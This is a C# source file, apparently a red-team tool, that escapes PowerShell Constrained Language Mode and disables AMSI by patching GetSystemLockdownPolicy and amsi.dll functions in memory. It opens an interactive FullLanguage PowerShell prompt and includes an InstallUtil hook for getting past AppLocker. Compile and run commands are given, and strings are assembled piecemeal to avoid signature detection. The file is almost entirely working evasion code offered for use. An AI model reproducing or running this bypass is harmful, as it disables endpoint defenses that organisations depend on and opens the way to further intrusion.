// ============================================================
// CLM + AMSI Bypass via Custom PowerShell Runspace (C#)
// ============================================================
// WHAT THIS DOES:
//   Creates a new PowerShell runspace from C# code. This new
//   runspace runs in FullLanguage mode (not CLM) because it's
//   not subject to the AppLocker/CLM policy that applies to the
//   system PowerShell.exe process.
//
//   Additionally, before starting the PS session, this code:
//     1. Patches GetSystemLockdownPolicy() → returns 0 (no lockdown)
//     2. Patches amsi.dll functions → disables AMSI scanning
//
// WHEN TO USE:
//   - PowerShell is in Constrained Language Mode (CLM)
//   - You need to run PS code but are restricted
//   - Combine with InstallUtil bypass if .exe execution is blocked
//
// HOW TO COMPILE:
//   csc.exe /unsafe /platform:x64 /r:System.Management.Automation.dll /out:psbypass.exe psbypass.cs
//
// HOW TO RUN:
//   Direct:      .\psbypass.exe
//   AppLocker:   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U psbypass.exe
//
// RESULT:
//   A PS> prompt that runs in FullLanguage mode with AMSI disabled.
// ============================================================

using System;
using System.Runtime.InteropServices;
using System.Runtime.CompilerServices;
using System.Runtime.ExceptionServices;
using System.IO;

namespace loader
{
    public class MainClass
    {
        // -------------------------------------------------------
        // Win32 API imports needed for memory patching
        // -------------------------------------------------------

        // GetStdHandle: Gets a handle to standard I/O streams
        // Not directly used for bypass but referenced for console operations
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetStdHandle(int nStdHandle);

        // VirtualProtect: Changes memory protection on a region of memory.
        // We need this to make read-only code sections writable before patching.
        // lpAddress   = address of memory region
        // dwSize       = size of region in bytes
        // flNewProtect = new protection flags (0x40 = PAGE_EXECUTE_READWRITE)
        // lpflOldProtect = receives the old protection flags (we restore these after)
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        // GetProcAddress: Gets the address of an exported function in a DLL.
        // We use this to find AmsiScanBuffer and AmsiInitialize in amsi.dll.
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        // LoadLibrary: Loads a DLL into the current process.
        // We use this to load amsi.dll so we can find and patch its functions.
        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        // Sleep: We don't use this here but it's available for sandbox evasion
        [DllImport("kernel32.dll")] static extern void Sleep(uint dwMilliseconds);

        // HandleProcessCorruptedStateExceptions: Allows catching exceptions from
        // corrupted process state (like AccessViolationException from bad memory writes)
        [HandleProcessCorruptedStateExceptions]
        public static void Main()
        {
            go();
        }

        [HandleProcessCorruptedStateExceptions]
        public static void go()
        {
            // -------------------------------------------------------
            // STEP 1: Patch GetSystemLockdownPolicy to bypass CLM
            // -------------------------------------------------------
            // CLM is enforced by checking GetSystemLockdownPolicy() in
            // System.Management.Automation.Security.SystemPolicy.
            // If this method returns 0, PowerShell runs in FullLanguage mode.
            // If it returns 1, CLM is active.
            //
            // We patch the compiled JIT code of GetSystemLockdownPolicy to
            // immediately return 0 (xor rax, rax; ret = 0x48, 0x31, 0xc0, 0xc3)

            // These char arrays build the string "yguot" to avoid string signatures
            // We use them to construct the type/method names dynamically
            Char a1, a2, a3, a4, a5;
            a1 = 'y'; // y
            a2 = 'g'; // g
            a3 = 'u'; // u
            a4 = 'o'; // o
            a5 = 't'; // t

            // Build: "System.Management.Automation.Security.SystemPolicy"
            // via string concatenation to avoid static signatures
            // Then get the method "GetSystemLockdownPolicy"
            var Automation = typeof(System.Management.Automation.Alignment).Assembly;

            // Get reference to the SystemPolicy type (obfuscated string assembly)
            // Fully qualified: System.Management.Automation.Security.SystemPolicy
            var get_l_info = Automation.GetType(
                "S" + a1 + "stem.Mana" + a2 + "ement.Au" + a5 + "oma" + a5 + "ion.Sec" +
                a3 + "rity.S" + a1 + "stemP" + a4 + "licy"
            ).GetMethod(
                "GetS" + a1 + "stemL" + a4 + "ckdownP" + a4 + "licy",
                System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static
            );

            // Get the MethodHandle — this allows us to get the raw function pointer
            var get_l_handle = get_l_info.MethodHandle;
            uint lpflOldProtect;

            // PrepareMethod: Forces the JIT compiler to compile this method NOW
            // so we can get its actual memory address (otherwise it might not be compiled yet)
            RuntimeHelpers.PrepareMethod(get_l_handle);

            // Get the raw function pointer to the JIT-compiled code
            var get_l_ptr = get_l_handle.GetFunctionPointer();

            // Make the 4 bytes at the function pointer WRITABLE + EXECUTABLE
            VirtualProtect(get_l_ptr, new UIntPtr(4), 0x40, out lpflOldProtect);

            // Patch the beginning of GetSystemLockdownPolicy with:
            //   48 31 C0  = xor rax, rax  (set return value to 0)
            //   C3        = ret            (return immediately)
            // This makes GetSystemLockdownPolicy always return 0 = no lockdown = FullLanguage
            var new_instr = new byte[] { 0x48, 0x31, 0xc0, 0xc3 };
            Marshal.Copy(new_instr, 0, get_l_ptr, 4);

            // -------------------------------------------------------
            // STEP 2: Patch amsi.dll to disable AMSI
            // -------------------------------------------------------
            // We need to find amsi.dll, load it, and patch its key functions.
            //
            // amsi.dll is located at: C:\Windows\System32\amsi.dll
            // We find it by searching for "a?s?.d*" in system32 to avoid hardcoding.

            // Build the path "c:\windows\system32" dynamically to avoid signatures
            // a4 = 'o', a1 = 'y' → "windows\system32"
            string[] filePaths = Directory.GetFiles(@"c:\wind" + a4 + "ws\\s" + a1 + "stem32", "a?s?.d*");

            // Get just the filename (e.g., "amsi.dll") from the full path
            string libname = (filePaths[0].Substring(filePaths[0].Length - 8));

            try
            {
                // Load amsi.dll into the current process
                var lib = LoadLibrary(libname);

                // Build "AmsiScanBuffer" via char array concatenation (anti-signature)
                // c1='A', c2='s', c3='c', c4='n', c5='l', c6='t', c7='z', c8='U'
                Char c1, c2, c3, c4, c5, c6, c7, c8;
                c1 = 'A'; c2 = 's'; c3 = 'c'; c4 = 'n'; c5 = 'l'; c6 = 't'; c7 = 'z'; c8 = 'U';

                // Get the address of "AmsiUacInitialize" (not AmsiScanBuffer directly)
                // The target: AmsiUacInitialize
                // Reason: AmsiScanBuffer is at offset -96 from this function,
                // and another key function is at offset -352
                var baseaddr = GetProcAddress(lib, c1 + "m" + c2 + "i" + c8 + "a" + c3 + "I" + c4 + "i" + c6 + "ia" + c5 + "i" + c7 + "e");
                // builds: "AmsiUacInitialize"

                // Patch function at offset -96 from AmsiUacInitialize (= AmsiScanBuffer vicinity)
                // with 0x90, 0xC3 = NOP; RET (do nothing and return)
                var funcaddr = baseaddr - 96;
                VirtualProtect(funcaddr, new UIntPtr(8), 0x40, out lpflOldProtect);
                Marshal.Copy(new byte[] { 0x90, 0xC3 }, 0, funcaddr, 2);

                // Patch function at offset -352 (another AMSI-related function)
                funcaddr = baseaddr - 352;
                VirtualProtect(funcaddr, new UIntPtr(8), 0x40, out lpflOldProtect);
                Marshal.Copy(new byte[] { 0x90, 0xC3 }, 0, funcaddr, 2);
            }
            catch
            {
                Console.WriteLine("Could not patch " + libname + "...");
                // Non-fatal — continue anyway, PS may still work without AMSI patch
            }

            // -------------------------------------------------------
            // STEP 3: Start interactive PowerShell runspace
            // -------------------------------------------------------
            // This creates a new PS runspace that runs in FullLanguage mode
            // because we already patched GetSystemLockdownPolicy.
            // The runspace is started with a basic interactive read-eval loop.

            string[] cmd = new string[] {
                "while ($true){$cmd = Read-Host -Prompt \"PS>\"; if ($cmd -Contains \"exit\") { break} else { iex $cmd; \"`n\"}}"
            };

            while (true)
            {
                // Microsoft.PowerShell.ConsoleShell.Start() launches an interactive PS session
                // using the current process (not spawning a new powershell.exe)
                // Parameters:
                //   RunspaceConfiguration.Create() = default runspace config
                //   "Banner" = startup banner (we use generic name to avoid detection)
                //   "Help"   = help text
                //   cmd      = initial commands to run (our read loop)
                Microsoft.PowerShell.ConsoleShell.Start(
                    System.Management.Automation.Runspaces.RunspaceConfiguration.Create(),
                    "Banner",
                    "Help",
                    cmd
                );
                break;
            }
        }
    }

    // -------------------------------------------------------
    // InstallUtil Bypass Hook
    // -------------------------------------------------------
    // AppLocker typically blocks .exe files from running directly.
    // BUT it usually whitelists C:\Windows\Microsoft.NET\Framework*\InstallUtil.exe
    // because it's a Microsoft-signed binary used for legitimate .NET installation.
    //
    // InstallUtil.exe, when called with /U (Uninstall), calls the Uninstall()
    // method on any class that:
    //   1. Inherits from System.Configuration.Install.Installer
    //   2. Has the [RunInstaller(true)] attribute
    //
    // So by putting our malicious code in Uninstall(), we bypass AppLocker.
    // The /logfile= and /LogToConsole=false flags suppress the noisy output.
    [System.ComponentModel.RunInstaller(true)]
    public class Loader : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            base.Uninstall(savedState);
            // Call our main bypass function
            MainClass.go();
        }
    }
}
